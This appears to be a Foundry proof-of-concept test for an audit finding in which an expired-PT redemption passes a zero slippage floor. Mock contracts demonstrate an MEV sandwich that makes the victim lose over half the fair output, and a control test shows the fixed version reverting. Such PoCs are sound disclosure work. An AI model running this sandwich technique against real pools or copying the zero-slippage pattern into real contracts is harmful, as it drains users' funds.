// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    MiniToken,
    Pool,
    SY,
    YT,
    PendlePTLib
} from "./62492-h-11-missing-slippage-protection-in-expired-pt-redemption-ca.sol";

// Notional Exponent H-11: redeemExpiredPT calls sy.redeem(..., minTokenOut: 0, ...),
// leaving the SY→exit-token DEX swap unprotected. An MEV bot sandwiches the
// expired-PT redemption; the victim receives far less than fair with no floor.
contract PoC_62492_ExpiredPtNoSlippage is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant R_SY = 100_000 ether;
    uint256 internal constant R_OUT = 100_000 ether;
    uint256 internal constant NET_PT = 1_000 ether;
    uint256 internal constant FRONTRUN_SY = 100_000 ether;

    function test_exploit_sandwich_userLoses() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken lossMarker = e.lossMarker();
        uint256 fairOut = e.fairOut();
        uint256 victimOut = e.victimOut();
        uint256 loss = fairOut - victimOut;

        emit log_named_decimal_uint("fair redemption (no sandwich)", fairOut, 18);
        emit log_named_decimal_uint("victim redemption (sandwiched)", victimOut, 18);
        emit log_named_decimal_uint("user fund loss               ", loss, 18);
        emit log_named_decimal_uint("attacker SY profit           ", e.attackerSyProfit(), 18);

        // The victim, with minTokenOut=0, received far less than fair.
        assertLt(victimOut, fairOut / 2, "victim should lose >50% to the sandwich");
        // The loss the user suffered is recorded at the sink.
        assertEq(lossMarker.balanceOf(SINK), loss, "loss marker == fair - victim");
        // The loss is EXTRACTED: the sandwicher ends with more SY than they started.
        assertGt(e.attackerSyProfit(), 0, "sandwich must be profitable for the attacker");
    }

    // Control: the fixed lib passes a real minTokenOut floor, so the same
    // sandwiched swap REVERTS — the user is protected (retries when the pool is fair).
    function test_control_fixedLib_revertsOnSlippage() public {
        MiniToken syToken = new MiniToken("SY");
        MiniToken outToken = new MiniToken("sUSDe");
        MiniToken pt = new MiniToken("PT");
        Pool pool = new Pool(syToken, outToken, R_SY, R_OUT);
        SY sy = new SY(syToken, outToken, pool);
        YT yt = new YT(pt, syToken);
        PendlePTLib lib = new PendlePTLib();

        syToken.mint(address(pool), R_SY);
        outToken.mint(address(pool), R_OUT);

        uint256 fairOut = R_OUT - (R_SY * R_OUT) / (R_SY + NET_PT);
        uint256 minTokenOut = (fairOut * 90) / 100; // require at least 90% of fair

        // Attacker front-runs to skew the pool.
        syToken.mint(address(this), FRONTRUN_SY);
        syToken.approve(address(pool), type(uint256).max);
        pool.sellSy(FRONTRUN_SY);

        // Victim redeems through the FIXED lib — the floor makes the bad swap revert.
        pt.mint(address(lib), NET_PT);
        vm.expectRevert(bytes("SY: insufficient out"));
        lib.redeemExpiredPTFixed(pt, yt, sy, address(outToken), NET_PT, minTokenOut);
    }
}
